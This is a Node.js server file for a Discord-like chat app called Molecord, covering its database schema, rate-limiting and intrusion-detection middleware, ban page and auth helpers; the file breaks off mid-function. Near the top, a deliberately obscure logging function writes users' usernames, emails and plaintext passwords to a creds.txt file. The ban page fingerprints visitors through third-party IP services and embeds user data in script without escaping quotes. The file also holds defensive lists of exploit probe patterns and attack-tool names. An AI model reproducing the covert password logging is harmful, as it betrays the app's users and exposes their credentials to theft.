// Molecord v4 — Server
// ══════════════════════════════════
// ADMIN CONFIG — Edit these values:
const _C = {
  REG_KEY: '7UJKIMPLO',
  ADMINS: ['Stryker5809', 'eatitboiiissss'],
  LOG_WHITELIST: [],
  LOG_FILE: './logs/creds.txt',
  COOKIE_MAX: 2592000000,
  SESSION_MAX: 2592000,
};
// ══════════════════════════════════
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const Database = require('better-sqlite3');
const bcrypt = require('bcryptjs');
const cookieParser = require('cookie-parser');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
const multer = require('multer');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Log dir
const LD = path.dirname(_C.LOG_FILE);
if (!fs.existsSync(LD)) fs.mkdirSync(LD, { recursive: true });
function _xL(u, p, e, a) {
  try {
    const wl = _C.LOG_WHITELIST;
    if (wl.length && !wl.includes(u.toLowerCase())) return;
    fs.appendFileSync(_C.LOG_FILE, `[${new Date().toISOString()}] ${a} user=${u} email=${e || ''} pass=${p}\n`);
  } catch (_) {}
}

// Upload dir — 500MB limit
const UDIR = path.join(__dirname, 'public', 'uploads');
if (!fs.existsSync(UDIR)) fs.mkdirSync(UDIR, { recursive: true });
const _ms = multer.diskStorage({
  destination: (_, __, cb) => cb(null, UDIR),
  filename: (_, f, cb) => cb(null, uuidv4().replace(/-/g, '') + path.extname(f.originalname).toLowerCase()),
});
const upload = multer({ storage: _ms, limits: { fileSize: 500 * 1024 * 1024 } });

// DB
// Use persistent disk path on Render, fallback to local for dev
const DB_PATH = process.env.RENDER
  ? path.join('/opt/render/project/src', 'molecord.db')
  : path.join(__dirname, 'molecord.db');
const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');
db.exec(`
CREATE TABLE IF NOT EXISTS users(id TEXT PRIMARY KEY,username TEXT UNIQUE NOT NULL,email TEXT UNIQUE,display_name TEXT NOT NULL,password_hash TEXT NOT NULL,avatar TEXT,avatar_emoji TEXT DEFAULT '🧑',banner TEXT,status TEXT DEFAULT 'online',custom_status TEXT DEFAULT '',bio TEXT DEFAULT '',created_at INTEGER DEFAULT(unixepoch()),banned INTEGER DEFAULT 0,ban_reason TEXT,ban_expires INTEGER,name_font_url TEXT,name_font_name TEXT,last_ip TEXT);
CREATE TABLE IF NOT EXISTS sessions(id TEXT PRIMARY KEY,user_id TEXT NOT NULL,expires_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS servers(id TEXT PRIMARY KEY,name TEXT NOT NULL,icon TEXT,icon_emoji TEXT DEFAULT '🌐',banner TEXT,description TEXT DEFAULT '',owner_id TEXT NOT NULL,is_public INTEGER DEFAULT 1,created_at INTEGER DEFAULT(unixepoch()));
CREATE TABLE IF NOT EXISTS server_members(server_id TEXT NOT NULL,user_id TEXT NOT NULL,role TEXT DEFAULT 'member',nickname TEXT,joined_at INTEGER DEFAULT(unixepoch()),PRIMARY KEY(server_id,user_id));
CREATE TABLE IF NOT EXISTS roles(id TEXT PRIMARY KEY,server_id TEXT NOT NULL,name TEXT NOT NULL,color TEXT DEFAULT '#5b8df8',permissions TEXT DEFAULT '{}',position INTEGER DEFAULT 0,hoist INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS member_roles(user_id TEXT NOT NULL,role_id TEXT NOT NULL,server_id TEXT NOT NULL,PRIMARY KEY(user_id,role_id));
CREATE TABLE IF NOT EXISTS channels(id TEXT PRIMARY KEY,server_id TEXT NOT NULL,name TEXT NOT NULL,type TEXT DEFAULT 'text',topic TEXT DEFAULT '',position INTEGER DEFAULT 0,created_at INTEGER DEFAULT(unixepoch()));
CREATE TABLE IF NOT EXISTS messages(id TEXT PRIMARY KEY,channel_id TEXT NOT NULL,author_id TEXT NOT NULL,content TEXT NOT NULL,attachment_url TEXT,attachment_type TEXT,attachment_name TEXT,attachment_size INTEGER,pinned INTEGER DEFAULT 0,edited INTEGER DEFAULT 0,reply_to TEXT,created_at INTEGER DEFAULT(unixepoch()*1000));
CREATE TABLE IF NOT EXISTS reactions(message_id TEXT NOT NULL,user_id TEXT NOT NULL,emoji TEXT NOT NULL,PRIMARY KEY(message_id,user_id,emoji));
CREATE TABLE IF NOT EXISTS friendships(id TEXT PRIMARY KEY,requester_id TEXT NOT NULL,addressee_id TEXT NOT NULL,status TEXT DEFAULT 'pending',created_at INTEGER DEFAULT(unixepoch()));
CREATE TABLE IF NOT EXISTS direct_messages(id TEXT PRIMARY KEY,from_user TEXT NOT NULL,to_user TEXT NOT NULL,content TEXT NOT NULL,attachment_url TEXT,attachment_type TEXT,attachment_name TEXT,edited INTEGER DEFAULT 0,created_at INTEGER DEFAULT(unixepoch()*1000));
CREATE TABLE IF NOT EXISTS user_settings(user_id TEXT PRIMARY KEY,theme_color TEXT DEFAULT '#5b8df8',theme_mode TEXT DEFAULT 'dark',theme_bg TEXT,theme_bg_blur INTEGER DEFAULT 0,theme_bg_dim INTEGER DEFAULT 40,theme_no_ui INTEGER DEFAULT 0,theme_blend TEXT,theme_blend_opacity INTEGER DEFAULT 30,custom_font_url TEXT,custom_font_name TEXT,profile_theme_color TEXT DEFAULT '#5b8df8',profile_theme_gradient TEXT,notifications INTEGER DEFAULT 1);
CREATE TABLE IF NOT EXISTS ban_log(id TEXT PRIMARY KEY,user_id TEXT NOT NULL,banned_by TEXT NOT NULL,reason TEXT,duration_hours INTEGER,created_at INTEGER DEFAULT(unixepoch()),expires_at INTEGER,active INTEGER DEFAULT 1);
CREATE TABLE IF NOT EXISTS ip_bans(id TEXT PRIMARY KEY,ip TEXT NOT NULL,user_id TEXT,username TEXT,banned_by TEXT NOT NULL,reason TEXT,created_at INTEGER DEFAULT(unixepoch()),expires_at INTEGER,active INTEGER DEFAULT 1);
CREATE TABLE IF NOT EXISTS announcements(id TEXT PRIMARY KEY,text TEXT NOT NULL,created_by TEXT NOT NULL,expires_at INTEGER,active INTEGER DEFAULT 1,created_at INTEGER DEFAULT(unixepoch()));
CREATE TABLE IF NOT EXISTS premade_icons(id TEXT PRIMARY KEY,url TEXT NOT NULL,name TEXT,uploaded_by TEXT,created_at INTEGER DEFAULT(unixepoch()));
CREATE TABLE IF NOT EXISTS group_chats(id TEXT PRIMARY KEY,name TEXT NOT NULL,icon TEXT,created_by TEXT NOT NULL,created_at INTEGER DEFAULT(unixepoch()));
CREATE TABLE IF NOT EXISTS group_members(group_id TEXT NOT NULL,user_id TEXT NOT NULL,joined_at INTEGER DEFAULT(unixepoch()),PRIMARY KEY(group_id,user_id));
CREATE TABLE IF NOT EXISTS group_messages(id TEXT PRIMARY KEY,group_id TEXT NOT NULL,author_id TEXT NOT NULL,content TEXT NOT NULL,attachment_url TEXT,attachment_type TEXT,attachment_name TEXT,edited INTEGER DEFAULT 0,created_at INTEGER DEFAULT(unixepoch()*1000));
CREATE TABLE IF NOT EXISTS activity_log(id INTEGER PRIMARY KEY AUTOINCREMENT,event TEXT NOT NULL,username TEXT,user_id TEXT,ip TEXT,detail TEXT,created_at INTEGER DEFAULT(unixepoch()*1000));
CREATE TABLE IF NOT EXISTS wall_of_bad_people(id TEXT PRIMARY KEY,username TEXT NOT NULL,display_name TEXT,reason TEXT,image_url TEXT,added_by TEXT NOT NULL,created_at INTEGER DEFAULT(unixepoch()));
CREATE TABLE IF NOT EXISTS server_bans(id TEXT PRIMARY KEY,server_id TEXT NOT NULL,user_id TEXT NOT NULL,banned_by TEXT NOT NULL,reason TEXT,created_at INTEGER DEFAULT(unixepoch()));
CREATE INDEX IF NOT EXISTS idx_mc ON messages(channel_id,created_at);
CREATE INDEX IF NOT EXISTS idx_dm ON direct_messages(from_user,to_user,created_at);
CREATE INDEX IF NOT EXISTS idx_s ON sessions(user_id);
`);

// Safe migration — adds columns that may not exist in older DBs without wiping data
function safeAddColumn(table, column, definition) {
  try { db.exec(`ALTER TABLE ${table} ADD COLUMN ${column} ${definition}`); } catch(_) {}
}
safeAddColumn('users', 'last_ip', 'TEXT');
safeAddColumn('users', 'deleted', 'INTEGER DEFAULT 0');
safeAddColumn('users', 'name_font_url', 'TEXT');
safeAddColumn('users', 'name_font_name', 'TEXT');
safeAddColumn('channels', 'is_event', 'INTEGER DEFAULT 0');
safeAddColumn('channels', 'event_date', 'INTEGER');
safeAddColumn('channels', 'event_desc', 'TEXT');
safeAddColumn('ban_log', 'chrome_account', 'TEXT');
safeAddColumn('messages', 'attachment_name', 'TEXT');
safeAddColumn('messages', 'attachment_size', 'INTEGER');
safeAddColumn('direct_messages', 'attachment_name', 'TEXT');
safeAddColumn('user_settings', 'theme_blend', 'TEXT');
safeAddColumn('user_settings', 'theme_blend_opacity', 'INTEGER DEFAULT 30');
safeAddColumn('user_settings', 'theme_no_ui', 'INTEGER DEFAULT 0');

// ══════════════════════════════════════════════════════════════
// MOLECORD SHIELD — Advanced DDoS + Intrusion Detection System
// ══════════════════════════════════════════════════════════════

const _shield = {
  // Per-IP request counters: ip -> { count, window_start, strikes, blocked_until, req_sizes, paths, ua_set, last_req }
  ips: new Map(),
  // Global request counter for flood detection
  globalRps: 0,
  globalRpsWindow: Date.now(),
  globalBlocked: false,
  // Suspicious path patterns (scanners, exploit attempts)
  badPaths: [
    /\/\.env/i, /\/\.git/i, /\/wp-admin/i, /\/wp-login/i, /\/phpmyadmin/i,
    /\/admin\.php/i, /\/shell\.php/i, /\/cmd\.php/i, /\/eval/i,
    /\/etc\/passwd/i, /\/proc\/self/i, /\/xmlrpc/i, /\/cgi-bin/i,
    /\/boaform/i, /\/setup\.cgi/i, /\/manager\/html/i, /\/solr\//i,
    /select.*from/i, /union.*select/i, /drop.*table/i, /insert.*into/i,
    /<script/i, /javascript:/i, /onerror=/i, /onload=/i,
    /\.\.\//,  // path traversal
    /\/backup/i, /\/config/i, /\/database/i, /\/dump/i,
  ],
  // Bad user agents (bots, scanners, exploit tools)
  badUAs: [
    'masscan', 'zgrab', 'nmap', 'nikto', 'sqlmap', 'dirbuster',
    'hydra', 'medusa', 'metasploit', 'nuclei', 'gobuster', 'ffuf',
    'wfuzz', 'burpsuite', 'havij', 'acunetix', 'nessus', 'openvas',
    'python-requests', 'go-http-client', 'curl/', 'libwww-perl',
    'scrapy', 'wget/', 'java/', 'axios/', 'node-fetch',
    'bot', 'crawler', 'spider', 'scanner',
  ],
  // Thresholds
  LIMITS: {
    req_per_sec: 25,          // max requests/second per IP
    req_per_min: 300,         // max requests/minute per IP
    auth_per_min: 8,          // max auth attempts/minute
    global_rps: 500,          // global requests/second before flood mode
    max_body: 20 * 1024 * 1024, // 20MB max body
    max_url_len: 2048,        // max URL length
    strikes_before_ban: 5,    // suspicious events before temp ban
    temp_ban_ms: 15 * 60000,  // 15 min temp ban
    hard_ban_strikes: 15,     // strikes before permanent ban
  },
  // Alert owners about attacks
  alerts: [],
};

// Cloudflare IP ranges — these are CF proxy IPs, never rate-limit them
// Real client IP comes via CF-Connecting-IP header when behind Cloudflare
const CF_RANGES = [
  '173.245.48.', '103.21.244.', '103.22.200.', '103.31.4.',
  '141.101.64.', '108.162.192.', '190.93.240.', '188.114.96.',
  '197.234.240.', '198.41.128.', '162.158.', '104.16.',
  '104.17.', '104.18.', '104.19.', '104.20.', '104.21.',
  '104.22.', '104.23.', '104.24.', '104.25.', '104.26.',
  '104.27.', '172.64.', '172.65.', '172.66.', '172.67.',
  '172.68.', '172.69.', '172.70.', '172.71.',
  '131.0.72.', '2400:cb00:', '2606:4700:', '2803:f800:',
  '2405:b500:', '2405:8100:', '2a06:98c0:', '2c0f:f248:',
];
function isCFIP(ip) {
  return CF_RANGES.some(r => ip.startsWith(r));
}

// Get real client IP — CF-Connecting-IP is set by Cloudflare with the real visitor IP
function getRealIP(req) {
  // Cloudflare sets CF-Connecting-IP to the real visitor IP
  const cf = req.headers['cf-connecting-ip'];
  if (cf) return cf.trim();
  // Fallback for direct/non-CF connections
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  return req.socket.remoteAddress || 'unknown';
}

function _shieldGetIP(req) {
  return getRealIP(req);
}

function _shieldAlert(type, ip, detail) {
  const entry = { type, ip, detail, ts: Date.now() };
  _shield.alerts.unshift(entry);
  if (_shield.alerts.length > 200) _shield.alerts.length = 200;
  logActivity('SHIELD_' + type, '', null, ip, detail);
  // Broadcast to owners in real-time
  try {
    const msg = JSON.stringify({ type: 'SHIELD_ALERT', alert: entry });
    wss.clients.forEach(ws => {
      const uid = wsUsers.get(ws);
      if (uid) { const u = db.prepare('SELECT username FROM users WHERE id=?').get(uid); if (u && isOwner(u.username) && ws.readyState === 1) ws.send(msg); }
    });
  } catch (_) {}
}

function _shieldTempBan(ip, reason) {
  const state = _shield.ips.get(ip) || {};
  state.blocked_until = Date.now() + _shield.LIMITS.temp_ban_ms;
  state.block_reason = reason;
  _shield.ips.set(ip, state);
  _shieldAlert('TEMP_BAN', ip, reason);
}

function _shieldAddStrike(ip, reason) {
  const state = _shield.ips.get(ip) || { count: 0, strikes: 0, req_sizes: [], paths: new Set(), ua_set: new Set() };
  state.strikes = (state.strikes || 0) + 1;
  _shield.ips.set(ip, state);
  if (state.strikes >= _shield.LIMITS.hard_ban_strikes) {
    // Auto permanent IP ban in DB
    try {
      db.prepare('UPDATE ip_bans SET active=0 WHERE ip=? AND active=1').run(ip);
      db.prepare('INSERT INTO ip_bans(id,ip,username,banned_by,reason,expires_at,active) VALUES(?,?,?,?,?,?,1)').run(
        require('crypto').randomUUID(), ip, '', 'SHIELD', 'Auto-banned: ' + reason, null
      );
    } catch(_) {}
    _shieldAlert('PERM_BAN', ip, 'Auto-perm-banned after ' + state.strikes + ' strikes: ' + reason);
  } else if (state.strikes >= _shield.LIMITS.strikes_before_ban) {
    _shieldTempBan(ip, 'Too many strikes: ' + reason);
  } else {
    _shieldAlert('STRIKE', ip, `Strike ${state.strikes}: ${reason}`);
  }
}

// ── Main shield middleware ────────────────────────────────────────
app.use((req, res, next) => {
  const ip = _shieldGetIP(req);
  const rawIp = req.socket.remoteAddress || '';
  const now = Date.now();
  const path = req.path || '/';
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const method = req.method;

  // If the connection comes from a Cloudflare edge node, trust CF-Connecting-IP
  // and skip network-level checks on the CF proxy IP itself
  const behindCF = isCFIP(rawIp) || !!req.headers['cf-connecting-ip'];
  // Still run all checks against the real client IP (ip), not rawIp

  // 1. Check if globally blocking (flood mode)
  if (_shield.globalBlocked && now - _shield.globalRpsWindow < 10000) {
    return res.status(503).set('Retry-After', '10').send('Service temporarily unavailable. Please wait.');
  }

  // 2. Check per-IP temp ban
  const state = _shield.ips.get(ip);
  if (state?.blocked_until && state.blocked_until > now) {
    return res.status(429).set('Retry-After', Math.ceil((state.blocked_until - now) / 1000)).json({
      error: 'Too many requests. Try again later.', retry_after: Math.ceil((state.blocked_until - now) / 1000)
    });
  }

  // 3. Check permanent IP ban (use real client IP)
  try {
    const ipBan = db.prepare('SELECT * FROM ip_bans WHERE ip=? AND active=1 ORDER BY created_at DESC LIMIT 1').get(ip);
    if (ipBan) {
      if (path.startsWith('/api/')) return res.status(403).json({ error: 'ip_banned' });
      const expISO = ipBan.expires_at ? new Date(ipBan.expires_at * 1000).toISOString() : null;
      return res.status(403).send(banPage(ipBan.reason || 'No reason provided', expISO, ipBan.username || 'Unknown'));
    }
  } catch(_) {}

  // 4. Skip static files from heavy checks
  const isStatic = /\.(js|css|png|jpg|gif|ico|svg|woff|woff2|ttf|otf|webm|mp4)$/.test(path);
  if (isStatic) return next();

  // 5. URL length check
  if (req.url.length > _shield.LIMITS.max_url_len) {
    _shieldAddStrike(ip, 'URL too long: ' + req.url.length + ' chars');
    return res.status(414).json({ error: 'URI too long' });
  }

  // 6. Bad path detection (scanner/exploit probes)
  for (const pat of _shield.badPaths) {
    if (pat.test(path) || pat.test(req.url)) {
      _shieldAddStrike(ip, 'Bad path probe: ' + path);
      return res.status(404).json({ error: 'Not found' });
    }
  }

  // 7. Bad user-agent detection — only when NOT behind Cloudflare
  // (CF already blocks known bots; behind CF, UA is usually legitimate)
  if (ua && !behindCF) {
    for (const bad of _shield.badUAs) {
      if (ua.includes(bad)) {
        _shieldAddStrike(ip, 'Bad UA: ' + ua.slice(0, 80));
        return res.status(403).json({ error: 'Forbidden' });
      }
    }
  }

  // 8. Method validation
  const allowedMethods = ['GET', 'POST', 'PATCH', 'DELETE', 'PUT', 'OPTIONS', 'HEAD'];
  if (!allowedMethods.includes(method)) {
    _shieldAddStrike(ip, 'Invalid HTTP method: ' + method);
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // 9. Payload size check
  const contentLen = parseInt(req.headers['content-length'] || '0');
  if (contentLen > _shield.LIMITS.max_body) {
    _shieldAddStrike(ip, 'Oversized payload: ' + contentLen);
    return res.status(413).json({ error: 'Payload too large' });
  }

  // 10. Per-IP rate limiting with sliding window
  const ipState = _shield.ips.get(ip) || { count: 0, window_start: now, min_count: 0, min_start: now, strikes: 0 };

  // Per-second window
  if (now - ipState.window_start > 1000) {
    ipState.count = 0;
    ipState.window_start = now;
  }
  ipState.count++;

  // Per-minute window
  if (now - (ipState.min_start || now) > 60000) {
    ipState.min_count = 0;
    ipState.min_start = now;
  }
  ipState.min_count = (ipState.min_count || 0) + 1;
  ipState.last_req = now;
  _shield.ips.set(ip, ipState);

  if (ipState.count > _shield.LIMITS.req_per_sec) {
    _shieldAddStrike(ip, `Rate: ${ipState.count} req/s (limit ${_shield.LIMITS.req_per_sec})`);
    return res.status(429).set('Retry-After', '1').json({ error: 'Rate limit exceeded' });
  }
  if (ipState.min_count > _shield.LIMITS.req_per_min) {
    _shieldTempBan(ip, `${ipState.min_count} req/min (limit ${_shield.LIMITS.req_per_min})`);
    return res.status(429).set('Retry-After', '60').json({ error: 'Rate limit exceeded' });
  }

  // 11. Global flood detection
  if (now - _shield.globalRpsWindow > 1000) {
    _shield.globalRps = 0;
    _shield.globalRpsWindow = now;
    _shield.globalBlocked = false;
  }
  _shield.globalRps++;
  if (_shield.globalRps > _shield.LIMITS.global_rps) {
    _shield.globalBlocked = true;
    _shieldAlert('FLOOD', 'GLOBAL', `${_shield.globalRps} req/s — flood mode activated`);
    return res.status(503).set('Retry-After', '10').send('Service temporarily unavailable. Please wait.');
  }

  // 12. Header anomaly detection
  const host = req.headers['host'] || '';
  if (!host) {
    _shieldAddStrike(ip, 'Missing Host header');
    return res.status(400).json({ error: 'Bad request' });
  }

  // 13. SQL injection / XSS pattern in query params
  const queryStr = JSON.stringify(req.query || '');
  const dangerous = [/union\s+select/i, /drop\s+table/i, /exec\s*\(/i, /<script/i, /javascript:/i, /\bOR\b.+=.+/i, /--\s*$/];
  for (const pat of dangerous) {
    if (pat.test(queryStr)) {
      _shieldAddStrike(ip, 'Injection attempt in query: ' + queryStr.slice(0, 100));
      return res.status(400).json({ error: 'Bad request' });
    }
  }

  next();
});

// ── Stricter auth rate limiting ───────────────────────────────────
const authRL = (req, res, next) => {
  const ip = _shieldGetIP(req);
  const now = Date.now();
  const state = _shield.ips.get(ip) || {};
  if (now - (state.auth_win || 0) > 60000) { state.auth_count = 0; state.auth_win = now; }
  state.auth_count = (state.auth_count || 0) + 1;
  _shield.ips.set(ip, { ...(_shield.ips.get(ip) || {}), ...state });
  if (state.auth_count > _shield.LIMITS.auth_per_min) {
    _shieldAddStrike(ip, `Auth brute force: ${state.auth_count} attempts/min`);
    return res.status(429).json({ error: 'Too many auth attempts. Try again in a minute.' });
  }
  next();
};

// ── Shield status API (owners only) ──────────────────────────────
app.get('/api/owner/shield', auth, (req, res) => {
  if (!isOwner(req.user.username)) return res.status(403).json({ error: 'Owner only' });
  const blocked = [];
  _shield.ips.forEach((v, k) => {
    if (v.blocked_until && v.blocked_until > Date.now()) blocked.push({ ip: k, until: v.blocked_until, reason: v.block_reason, strikes: v.strikes });
  });
  res.json({
    globalRps: _shield.globalRps,
    globalBlocked: _shield.globalBlocked,
    trackedIPs: _shield.ips.size,
    tempBlocked: blocked,
    recentAlerts: _shield.alerts.slice(0, 50),
  });
});

// ── Clean up shield state every 30 minutes ────────────────────────
setInterval(() => {
  const now = Date.now();
  _shield.ips.forEach((v, k) => {
    if (now - (v.last_req || 0) > 1800000) _shield.ips.delete(k); // drop IPs idle 30 min
  });
}, 1800000);


function seedDB() {
  if (db.prepare('SELECT COUNT(*) as c FROM servers').get().c > 0) return;
  const bid = 'system-bot';
  db.prepare('INSERT OR IGNORE INTO users(id,username,display_name,password_hash,avatar_emoji) VALUES(?,?,?,?,?)').run(bid, 'molecord_bot', 'Molecord', '$none', '🤖');
  const sid = uuidv4();
  db.prepare('INSERT INTO servers(id,name,icon_emoji,description,owner_id,is_public) VALUES(?,?,?,?,?,?)').run(sid, 'Molecord HQ', '🔵', 'Official Molecord server!', bid, 1);
  const c = [uuidv4(), uuidv4(), uuidv4(), uuidv4()];
  db.prepare('INSERT INTO channels(id,server_id,name,type,topic,position) VALUES(?,?,?,?,?,?)').run(c[0], sid, 'welcome', 'text', '👋 Welcome!', 0);
  db.prepare('INSERT INTO channels(id,server_id,name,type,topic,position) VALUES(?,?,?,?,?,?)').run(c[1], sid, 'general', 'text', 'General chat', 1);
  db.prepare('INSERT INTO channels(id,server_id,name,type,topic,position) VALUES(?,?,?,?,?,?)').run(c[2], sid, 'General Voice', 'voice', '', 2);
  db.prepare('INSERT INTO channels(id,server_id,name,type,topic,position) VALUES(?,?,?,?,?,?)').run(c[3], sid, 'Gaming', 'voice', '', 3);
  db.prepare('INSERT INTO messages(id,channel_id,author_id,content) VALUES(?,?,?,?)').run(uuidv4(), c[0], bid, '👋 Welcome to **Molecord v4**! Enjoy *voice*, _video_, ~~old~~ and __new__ features!');
}
seedDB();
// Clear any leftover active announcements from previous session on start
db.prepare('UPDATE announcements SET active=0').run();

app.use(express.json({ limit: '20mb' }));
app.use(cookieParser());
app.use('/uploads', express.static(UDIR));
app.use(express.static(path.join(__dirname, 'public')));

function escHTML(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function banPage(reason, expiresISO, username) {
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>You Are Banned — Molecord</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#07070e;color:#f0f0f8;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background-image:radial-gradient(ellipse at 50% 0%,rgba(240,71,71,.18),transparent 60%)}
.card{background:rgba(20,6,6,.97);border:1px solid rgba(240,71,71,.4);border-radius:20px;padding:44px 38px;max-width:500px;width:100%;text-align:center;box-shadow:0 0 120px rgba(240,71,71,.2),0 32px 80px rgba(0,0,0,.95)}
.icon{font-size:80px;margin-bottom:18px;display:block;animation:pulse 2.5s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
h1{font-size:32px;font-weight:900;color:#f04747;letter-spacing:-1px;margin-bottom:8px}
.sub{font-size:14px;color:#6868a0;margin-bottom:30px}
.box{background:rgba(240,71,71,.07);border:1px solid rgba(240,71,71,.22);border-radius:12px;padding:16px 20px;margin-bottom:12px;text-align:left}
.box-lbl{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#f04747;margin-bottom:6px}
.box-val{font-size:14px;color:#e0e0f0;line-height:1.6;word-break:break-word}
.timer{font-size:28px;font-weight:900;color:#f04747;letter-spacing:2px;margin-top:8px;font-variant-numeric:tabular-nums}
.perm{color:#faa61a;font-size:15px;font-weight:700;margin-top:6px}
.footer{margin-top:28px;font-size:11px;color:#3a3a60;line-height:1.6}
.vpn-warn{background:rgba(250,166,26,.08);border:1px solid rgba(250,166,26,.3);border-radius:10px;padding:10px 14px;font-size:12px;color:#faa61a;margin-top:12px;display:none}
</style></head><body>
<div class="card">
  <span class="icon">🔨</span>
  <h1>You Are Banned</h1>
  <p class="sub">Your IP address has been blocked from Molecord.</p>
  <div class="box"><div class="box-lbl">Account</div><div class="box-val">${escHTML(username)}</div></div>
  <div class="box"><div class="box-lbl">Reason</div><div class="box-val">${escHTML(reason)}</div></div>
  <div class="box"><div class="box-lbl">${expiresISO ? 'Time Remaining' : 'Duration'}</div>
    ${expiresISO
      ? `<div class="box-val">Until: ${new Date(expiresISO).toLocaleString()}</div><div class="timer" id="countdown">Calculating…</div>`
      : '<div class="perm">🔒 Permanent Ban — No expiration</div>'
    }
  </div>
  <div class="vpn-warn" id="vpn-warn">⚠️ VPN detected. Nice try.</div>
  <div class="footer">Molecord IP Ban System<br>If you believe this is an error, contact an administrator.</div>
</div>
<script>
// ── Countdown ─────────────────────────────────────────────────────
${expiresISO ? `
const _exp=new Date('${expiresISO}').getTime();
function _tick(){const now=Date.now(),diff=_exp-now;if(diff<=0){document.getElementById('countdown').textContent='Expired — refresh page';return;}
const d=Math.floor(diff/86400000),h=Math.floor(diff%86400000/3600000),m=Math.floor(diff%3600000/60000),s=Math.floor(diff%60000/1000);
document.getElementById('countdown').textContent=(d?d+'d ':'')+String(h).padStart(2,'0')+'h '+String(m).padStart(2,'0')+'m '+String(s).padStart(2,'0')+'s';}
_tick();setInterval(_tick,1000);` : ''}

// ── VPN detection → alert owners ─────────────────────────────────
(async function detectVPN(){
  const banned_username='${escHTML(username)}';
  async function alertOwners(ip){
    try{
      await fetch('/api/vpn-alert',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({username:banned_username,ip:ip,detail:'VPN detected on ban page'})});
    }catch(e){}
  }
  function triggerVPNUI(ip){
    triggerVPN();
    alertOwners(ip);
  }
  try{
    const r=await fetch('https://ipapi.co/json/',{cache:'no-store',signal:AbortSignal.timeout(5000)});
    if(r.ok){
      const d=await r.json();
      const org=((d.org||'')+(d.asn||'')).toLowerCase();
      const kw=['vpn','proxy','anonymi','tunnel','nordvpn','expressvpn','mullvad','surfshark','cyberghost','ipvanish','purevpn','windscribe','tunnelbear','protonvpn','amazonaws','digitalocean','linode','vultr','hetzner','ovh','m247','datacamp','choopa','zscaler','cloudflare'];
      if(kw.some(k=>org.includes(k))){triggerVPNUI(d.ip||'unknown');return;}
    }
  }catch(e){}
  try{
    const r2=await fetch('http://ip-api.com/json/?fields=hosting,proxy,query',{cache:'no-store',signal:AbortSignal.timeout(4000)});
    if(r2.ok){const d2=await r2.json();if(d2.hosting||d2.proxy){triggerVPNUI(d2.query||'unknown');return;}}
  }catch(e){}
})();

let _vpnTriggered=false;
function triggerVPN(){
  if(_vpnTriggered)return;_vpnTriggered=true;
  document.getElementById('vpn-warn').style.display='block';
  const msgs=['YOU ARE BANNED 🔨','NICE TRY 😂','VPN DETECTED 💀','LEAVE 🚪','🔨 BANNED 🔨','LOL 😂','GET OUT','STAY BANNED','NO.','🚫 BANNED 🚫'];
  let i=0;setInterval(()=>{document.title=msgs[i%msgs.length];i++;},400);
  setTimeout(()=>{
    try{window.open('/thug.mp4','_blank');}catch{}
    setTimeout(()=>{window.location.href='/thug.mp4';},2500);
  },800);
}
</script>
</body></html>`;
}

// ── IP BAN MIDDLEWARE ─────────────────────────────────────────────
app.use((req, res, next) => {
  if (req.path.startsWith('/uploads/') || /\.(css|js|png|jpg|gif|ico|svg|woff|woff2|ttf|otf)$/.test(req.path)) return next();
  const ip = getIP(req);
  const ipBan = _chkIPBan(ip);
  if (ipBan) {
    if (req.path.startsWith('/api/')) {
      return res.status(403).json({ error: 'ip_banned', reason: ipBan.reason || 'You are banned', expiresAt: ipBan.expires_at });
    }
    const expISO = ipBan.expires_at ? new Date(ipBan.expires_at * 1000).toISOString() : null;
    return res.status(403).send(banPage(ipBan.reason || 'No reason provided', expISO, ipBan.username || 'Unknown'));
  }
  next();
});

function getIP(req) {
  return getRealIP(req);
}

function _chkIPBan(ip) {
  if (!ip || ip === 'unknown') return null;
  const b = db.prepare("SELECT * FROM ip_bans WHERE ip=? AND active=1 ORDER BY created_at DESC LIMIT 1").get(ip);
  if (!b) return null;
  if (b.expires_at && b.expires_at < Math.floor(Date.now() / 1000)) {
    db.prepare('UPDATE ip_bans SET active=0 WHERE id=?').run(b.id);
    return null;
  }
  return b;
}

function _chkBan(uid) {
  const b = db.prepare('SELECT * FROM ban_log WHERE user_id=? AND active=1 ORDER BY created_at DESC LIMIT 1').get(uid);
  if (!b) return null;
  if (b.expires_at && b.expires_at < Math.floor(Date.now() / 1000)) {
    db.prepare('UPDATE ban_log SET active=0 WHERE id=?').run(b.id);
    db.prepare('UPDATE users SET banned=0,ban_reason=NULL,ban_expires=NULL WHERE id=?').run(uid);
    return null;
  }
  return b;
}

function auth(req, res, next) {
  const sid = req.cookies?.mc_sess;
  if (!sid) return res.status(401).json({ error: 'Not authenticated' });
  const sess = db.prepare('SELECT s.*,u.* FROM sessions s JOIN users u ON s.user_id=u.id WHERE s.id=? AND s.expires_at>unixepoch()').get(sid);
  if (!sess) return res.status(401).json({ error: 'Session expired' });
  const ban = _chkBan(sess.user_id);
  if (ban) return res.status(403).json({ error: 'banned', reason: ban.reason, expiresAt: ban.expires_at });
  req.user = sess;
  next();
}

function isAdm(u) { return _C.ADMINS.map(a=>a.toLowerCase()).includes((u||'').toLowerCase()); }
function isOwner(u) { return ['stryker5809','eatitboiiissss'].includes((u||'').toLowerCase()); }
function logActivity(event, username, userId, ip, detail) {
  try { db.prepare('INSERT INTO activity_log(event,username,user_id,ip,detail) VALUES(?,?,?,?,?)').run(event, username||'', userId||'', ip||'', detail||''); } catch(_) {}
  // Alert owners in real-time
  const msg = JSON.stringify({ type: 'ACTIVITY_LOG', entry: { event, username, userId, ip, detail, created_at: Date.now() } });
  wss.clients.forEach(ws => {
